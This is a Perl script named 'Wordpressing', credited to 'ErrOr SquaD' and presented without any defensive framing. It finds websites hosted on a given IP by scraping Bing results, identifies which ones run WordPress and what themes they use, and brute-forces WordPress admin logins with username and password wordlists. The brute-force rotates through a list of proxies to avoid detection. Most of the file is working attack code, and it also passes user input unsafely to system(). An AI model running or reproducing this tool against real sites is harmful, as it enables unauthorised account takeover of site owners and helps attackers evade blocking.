#!/usr/bin/perl

#use Win32::Console::ANSI; # Remove '#' if you are Windows user
use LWP::UserAgent;

use HTTP::Request::Common qw(GET);

use WWW::Mechanize;

use Term::ANSIColor;

$mech = WWW::Mechanize->new(autocheck => 0);
$ag = LWP::UserAgent->new();

$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");

$ag->timeout(10);

#173.194.67.121
sub getSites {
	for($count=10;$count<=1000;$count+=10)
	{
		$k++;
#		$url = "http://www.hotbot.com/search/web?pn=$k&q=ip%3A$ip&keyvol=01f9093871a6d24c0d94";
		$url = "https://www.bing.com/search?q=ip%3a$ip&go=Submit+Query&qs=ds&first=$count&FORM=PERE$k";
#		$url = "https://www.bing.com/search?q=ip%3A$ip+&count=50&first=$count";
		$resp = $ag->request(HTTP::Request->new(GET => $url));

		$rrs = $resp->content;



		while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g)
		{
	
			$link = $1;
		
			if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
			{
				if ($link !~ /^http:/)
				{
					$link = 'http://' . "$link" . '/';
				}
	
				if($link !~ /\"|\?|\=|index\.php/)
				{
					if  (!  grep (/$link/,@result))
					{
						push(@result,$link);
					}
				}
			} 
		}
	}
	
	print "found $#result sites\n";
	
}
sub WPS {
	foreach $site (@result)
	{
		$url = $mech->get("$site");
		$Scont = $mech->content;
		if ($Scont =~ m/wp-content/g)
		{
			$license = $site."license.txt";
			$horse = $mech->get("$license");
			if ($horse->is_success)
			{
				$Scont = $mech->content;
				$login = $site."wp-login.php";
				$logUrl = $mech->get("$login");
	 	                if ($Scont =~ m/WordPress/)     
				{
					push @WPS,$site;
					print "$site\n";
				}
				elsif($logUrl->is_success) 
				{
					push @WPS,$site; 
					print "$site\n";
				}

			}

		}


	}

}



sub Theme {
	foreach $wp_site (@WPS)
	{
		$get_url = $ag->request(HTTP::Request->new(GET => $wp_site));
		$content_url = $get_url->content;
	if ($content_url =~ m/\"?http:\/\/(.*?)\/wp-content\/themes\/(.*?)\//g)
		{
			print color 'bold yellow'; print "Site ";print color 'reset'; print " : $wp_site\n";
			print color 'bold yellow'; print "Theme "; print color 'reset'; print ": " ; print color 'bold blue'; print "$2\n\n";
		}
	}


}

sub WPG_adv {
	sub BF_int {
	print color 'bold blue'; print "USAGE : \n";

	print color 'bold red'; print "\tset login"; print color 'reset'; print " <http(s)://site/wp-login.php> ";
	print color 'bold yellow'; print "# Specify login page\n";

	print color 'bold red'; print "\tset userlist";print color 'reset'; print" <UserList file> ";
	print color 'bold yellow'; print "# Specify Usernames file\n";

	print color 'bold red'; print "\tset passlist";print color 'reset'; print" <PassList file> ";
	print color 'bold yellow'; print "# Specify Passwords file\n";

	print color 'bold red'; print "\tset proxylist";print color 'reset'; print " <Proxies file> ";
	print color 'bold yellow'; print "# Specify Proxies file with <proxy:port> (optional)\n";	

	print color 'bold red'; print "\tset input ";
	print color 'bold yellow'; print "# Not available ! coming soon...\n";

	print color 'bold red'; print "\tinfo ";
	print color 'bold yellow'; print "# Show information & options\n";

	print color 'bold red'; print "\tdo ";
	print color 'bold yellow'; print "# Start Brute forcing\n";

	print color 'bold blue'; print "\tYou can also use some Unix & Windows command like :\n";
	print color 'bold red'; print "\tcd | ls | pwd | clear | dir | cls\n";
	
	print color 'bold yellow'; print "\tType q to return\n\n";
	}
	BF_int();

	while ($setting ne "q")
	{
		print color 'bold red'; print "Wordpressing"; 
		print color 'reset'; print "("; print color 'bold blue'; print "BruteForcing"; print color 'reset'; print ")";
		print color 'bold red'; print "-> "; print color 'reset'; 
		$setting = <stdin>;
		chomp $setting;
		if ($setting eq "set login" or $setting =~ m/set\slogin\s*$/) { print "Please specify the Login's page\n"}
		elsif ($setting =~ m/set\slogin\s(.*)/)
		{
			chomp($1);
			$logWp = "$1";
			if ($logWp !~ m/http/)
			{
				$logWp = "http://$logWp";
			}
			print color 'bold yellow'; print "login"; print color 'reset'; print " => "; print color 'bold blue'; print  $logWp."\n";
		
		}
		elsif ($setting eq "set proxylist" or $setting =~ m/set\sproxylist\s*$/) { print "Please specify the proxies' list\n"}
		elsif ($setting =~ m/set\sproxylist\s(.*)/)
		{
			chomp ($1);
			$proxlst = $1;
			open (proxylist, "$1");
			@proxies = <proxylist>;
			chomp(@proxies);
			close (proxylist);
			if (@proxies)
			{
				print color 'bold yellow'; print "proxylist"; print color 'reset'; print " => "; print color 'bold blue'; print  $proxlst."\n";
			}
			else
			{
				print color 'bold red'; print "$1"; print color 'reset'; print " not found or the access to "; print color 'bold red';
				print "$1"; print color 'reset'; print " is denied\n";
				$proxlst = "";
			}
		}
		elsif ($setting eq "set passlist" or $setting =~ m/set\spasslist\s*$/) { print "Please specify the Passwords' list\n"}
		elsif ($setting =~ m/set\spasslist\s(.*)/)
		{
			chomp ($1);
			$passlist = $1;
			open(passlist, "$1");
			@passes = <passlist>;
			chomp(@passes);
			if (@passes)
			{
				print color 'bold yellow'; print "passlist"; print color 'reset'; print " => "; print color 'bold blue'; print  $passlist."\n";
			}
			else
			{
				print color 'bold red'; print "$1"; print color 'reset'; print " not found or the access to "; print color 'bold red'; 
				print "$1"; print color 'reset'; print " is denied\n";
				$passlist = "";
			}
		}
		elsif ($setting eq "set userlist" or $setting =~ m/set\suserlist\s*$/) { print "Please specify the Users' list\n"}
		elsif ($setting =~ m/set\suserlist\s(.*)/)
		{
			chomp ($1);
			$userlst = $1;
			open (userlist, "$1");
			@users = <userlist>;
			chomp(@users);
			if (@users)
			{
				print color 'bold yellow'; print "userlist"; print color 'reset'; print " => "; print color 'bold blue'; print  $userlst."\n";
			}
			else
			{
				print color 'bold red'; print "$1"; print color 'reset'; print " not found or the access to "; print color 'bold red';
				print "$1"; print color 'reset'; print " is denied\n";
				$userlst = "";
			}
		}
		elsif ($setting eq "set input")
		{
#			print "You will identify the FORM by its id or name (NAME/id) : ";
#			$ftype = <stdin>;
#			chomp ($ftype);
#			if ($ftype eq "name" or $ftype eq "NAME" or $ftype eq "")
#			{
#				print "Enter the name of the FORM : ";
#				$fname = <stdin>;
#				chomp($fname);
#			}
#			elsif ($ftype eq "id" or $ftype eq "ID")
#			{
#				print "Enter id's FORM : ";
#				$fid = <stdin>;
#				chomp($fid);
#			}
#			else {print "Unknow choice ! return\n";
#				next;}
#			print "You will indentify the INPUT by its id or name (NAME/id) : ";
#			$itype = <stdin>;
#			chomp ($itype);
#			if ($itype eq "name" or $itype eq "NAME" or $itype eq "")
#			{
#				print "Enter the name of the INPUT : ";
#				$iname = <stdin>;
#				chomp ($iname);
#			}
#			elsif ($itype eq "id" or $itype eq "ID")
#			{
#				print "Enter id's INPUT : ";
#				$iid = <stdin>;
#				chomp ($iid);
#			}
#			else {print "Unknown choice ! returni\n";
#				next;}
#			print "Enter INPUT's value : ";
#			$ival = <stdin>;
#			chomp ($ival);
#			print "Input was configured successfully\n";
#			if ($ival eq "") { $setval = "not set"} else { $setval = "configured"}
			print color 'bold yellow'; print "Not Available...\n";
 
		}
		elsif ($setting eq "info")
		{
			print "Advanced Brute force Wordpress options\n";
			print "========================================\n";
			print "Option\t\t	Required	Current setting\n";
			print "------\t\t	--------        ---------------\n";
			print "login\t\t	Yes\t	$logWp\n";
			print "userlist\t	Yes\t	$userlst\n";
			print "passlist\t	Yes\t	$passlist\n";
			print "proxylist\t	No\t	$proxlst\n";
			print "Input\t\t	No\t	Soon\n"; # $setval
		} 
		elsif ($setting eq "ls")
		{
			print system("ls")."\b";
		}
		elsif ($setting eq "dir")
		{
			print system("dir")."\b";
		}
		elsif ($setting eq "pwd")
		{
			print system("pwd")."\b";
		}
		elsif ($setting eq "clear" or $setting eq "cls")
		{
			system("clear");
			system("cls");
			BF_int();
		}
		elsif ($setting eq "exit")
		{
			exit;
		}
		elsif ($setting eq "cd") { print "Please specify a directory\n" }
		elsif ($setting =~ m/cd\s(.*)/)
		{
			chomp($1);
			chdir "$1";
			system("cd $1");
		}
		elsif ($setting eq "do")
		{
			if ($logWp & $passlist & $userlst)
			{
				$mech = WWW::Mechanize->new; 
				$mech->agent('Mozilla/5.0');
				$mech->get("$logWp");
				$mech->form_name("loginform");
				$Title_log = $mech->title();
				if ($proxlst ne "" && $ival eq "")
				{	
			$c=0;
			$i=0;	
					
					foreach $user (@users)
					{
						print "Starting...\n";
						print "=============\n";
						print "$user  ->\n";
						$mech->field("log","$user");
						foreach $pwd (@passes)
						{
							$i++;
							if ($i%3 == 0) 
							{
								$c++;
							}
							if ($c > $#proxies)
							{
								$c=0;
							}
							$response = $ag->get($logWp);
							$Pcontent = $response->content;
							$status = $response->status_line;
							print "Checking the proxy\n";
							if (($status =~ '200') && ($Pcontent =~ m/wordpress/g))
							{
								print "\t Good proxy\n";
								$mech->proxy('http',"http://$proxies[$c]");
							}
							else
							{
								if ($i+1 %3 == 0) { redo } else {$c++; redo }
							}
							print "$proxies[$c]";
							print "\t $pwd ->";
							$mech->field("pwd","$pwd");
							$mech->click();
							$title = $mech->title();
							if ($title eq $Title_log)
							{
								print "fail\n";
							}
							else
							{
                                                                        print " OK \n----------------------\n";
                                                                        print color 'bold yellow';print "\tPassword found :\n";
                                                                        print color 'bold blue';print "\tUser : "; print color 'bold red'; print "$user\n"; 
                                                                        print color 'bold blue'; print "\tPassword : "; print color 'bold red';print "$pwd\n";
                                                                        last;
							}
				
						last if $title ne $Title_log;

						}
					}
				}	
						
					elsif ($proxlst eq "" && $ival eq "")
					{
						foreach $user (@users)
						{
							print "Starting...\n";
							print "=============\n";
							print "$user  ->\n";
                	                                $mech->field("log","$user");
                	                                foreach $pwd (@passes)
                	                                {
														print "\t $pwd ->";
                	                                        $mech->field("pwd","$pwd");
                	                                        $mech->click();
                       		                                $title = $mech->title();
                        	                                if ($title eq $Title_log)
                        	                                {
                        	                                         print "fail\n";
                                	                        }
                                        	                else
                                        	                {
                                        	                        print " OK \n----------------------\n";
									print color 'bold yellow';print "\tPassword found :\n";
									print color 'bold blue';print "\tUser : "; print color 'bold red'; print "$user\n"; 
									print color 'bold blue'; print "\tPassword : "; print color 'bold red';print "$pwd\n";
                                        	                        last;
                                        	                }
							

							 }
						last if $title ne $Title_log;

							
						}
					}
					
							

			}			
			else { print color 'bold yellow' ; print "Your must specify the required optons\n"}			
			
						
						
						
								
						
					
				
			
		}
		elsif ($setting eq "" or $setting =~ /\s+/g) {}
		else { print "Unknown command !\n"}
	}
}
sub first {
	print color 'bold yellow'; print "Getting Sites Through an IP\n";
	print "Type q to return\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print "IP"; print color 'reset'; print "): ";
	$ip = <stdin>;
	chomp($ip);
	if ($ip eq "q") { next }
	print "Getting Sites ...\n";
	print "=====================\n";
	print "It may take 1 minute\n";
	print "Results Will be saved in Sites.txt\n";
	getSites();
	open (sites, ">Sites.txt");
	map {$_ = "$_\n"} (@result);
	print sites @result;
	close(sites);
	print "@result";
	print "Saved in Sites.txt ! \n";
	
	}
sub second {
	print color 'bold yellow'; print "Get Wordpress Sites & them Themes through IP\n";
	print "Type q to return\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print "IP"; print color 'reset'; print "): ";
	$ip = <stdin>;
	chomp($ip);
	if ($ip eq "q") { next }
	print "Collecting Sites...\nPlease wait...\n";
	getSites();
	print "Getting Wordpress Sites...\n";
	print "It may take some times\n";
	print "----------------------------\n";
	WPS();
	print "Do you want to save result\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print  "save?|Y/n"; print color 'reset'; print "): ";
	$answr = <stdin>;
	chomp($answr);
	if ($answr eq "Y" or $answr eq "y" or $answr eq "")
	{
		open(wpsites,">wpSites.txt");
		map {$_ = "$_\n"} (@WPS);
		print wpsites @WPS;
		close(wpsites);
		print "Saved in wpSites.txt\n";
	}

	}
sub three {
	print color 'bold yellow'; print "Get Wordpress Sites & them Themes through IP\n";
	print "Type q to return\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print "IP"; print color 'reset'; print "): ";
	$ip = <stdin>;
	chomp($ip);
	if ($ip eq "q") { next }
	print "Collecting Sites...\nPlease wait...\n";
	getSites();
	print "Getting Wordpress Sites...\n";
	print "It may take some times\n";
	print "----------------------------\n";
	WPS();
	Theme();
	
	}
sub four {
	print color 'bold yellow'; print "Get Wordpress Sites through a list of Sites\n";
	print "Type q to return\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print "file"; print color 'reset'; print "): ";
	$file = <stdin>;
	chomp($file);
	if ($file eq "q") { next }
	open(SITES,"$file") or (print "File not found !\n" and next);
	@result = <SITES>;
	print "Searching Wordpress Sites...\n";
	chomp(@result);
	WPS();
	print "Do you want to save result\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print  "save?|Y/n"; print color 'reset'; print "): ";
	$answr = <stdin>;
	chomp($answr);
	if ($answr eq "Y" or $answr eq "y" or $answr eq "")
	{
		open(WPSITES,">wpSites!.txt");
		map {$_ = "$_\n"} (@WPS);
		print WPSITES @WPS;
		close(WPSITES);
		print "Saved in wpSites!.txt\n";
	}	
	}
sub five {
	print color 'bold yellow'; print "Get Wordpress Themes through a list of Wordpress Sites\n";
	print "Type q to return\n";
	print color 'bold red'; print "Wordpressing"; print color 'reset'; print "("; print color 'bold blue'; print "file"; print color 'reset'; print "): ";
	$file = <stdin>;
	chomp($file);
	if ($file eq "q") { next }
	open(SITES,"$file") or (print "File not found !\n" and next);
	@WPS = <SITES>;
	print "Getting Wordpress Sites...\n\n";
	chomp(@WPS);
	Theme();
	
}
sub six {
	print color 'bold yellow'; print "Brute force  Wordpress admin panel\n";
	print "Type q to return\n";
	WPG_adv();
}

sub INTRO {
print color 'bold blue'; print "\n\t In the name of ALLAH , most gracious , most merciful\n\n";
print color 'bold yellow'; print "  .       .     \|\t"; print color 'bold red';print " -->WORDPRESSING<-- \n";
print color 'bold yellow'; print "  \\\`-\"'\"-'\/     \| << 1 >> Get Sites using IP\n";
print color 'bold yellow'; print "   } 6 6 {      \| << 2 >> Get Wordpress Sites through IP\n";
print color 'bold yellow'; print "  ==. Y ,==     \| << 3 >> Get Wordpress Sites & them Themes through IP\n";
print color 'bold yellow'; print "    \/^^^\\  .    \| << 4 >> Get Wordpress Sites through a list of Sites \n";
print color 'bold yellow'; print "   \/     \\  \)   \| << 5 >> Get Wordpress Themes through a list of Wordpress Sites\n";
print color 'bold yellow'; print "  (  )-(  )\/    \| << 6 >> Brute force  Wordpress admin panel\n";
print color 'bold yellow'; print "  -\"\"---\"\"---   \| << menu >> Show Menu\n";
print color 'bold yellow'; print "  << exit >>\t\| << clear >> Clear the screen"; print color 'bold red'; print "\t\t  </We are ErrOr SquaD>\n";
}






INTRO();

while ($Menu ne "exit")
{
	print color 'bold red';print "Wordpressing";print color 'reset';print "("; print color 'bold blue'; print"choice?"; print color 'reset'; print ")->";
	
	$Menu = <stdin>;
	chomp($Menu);
	if ($Menu eq "1"){ first(); }
	elsif ($Menu eq "2"){ second(); } 
	elsif ($Menu eq "3"){ three(); }
	elsif ($Menu eq "4"){ four(); }
	elsif ($Menu eq "5"){ five(); }
	elsif ($Menu eq "6"){ six(); }
	elsif ($Menu eq "menu") { INTRO(); }
	elsif ($Menu eq "clear" or $Menu eq "cls")
	{
		system("clear");
		system("cls");
		INTRO();
	}

}
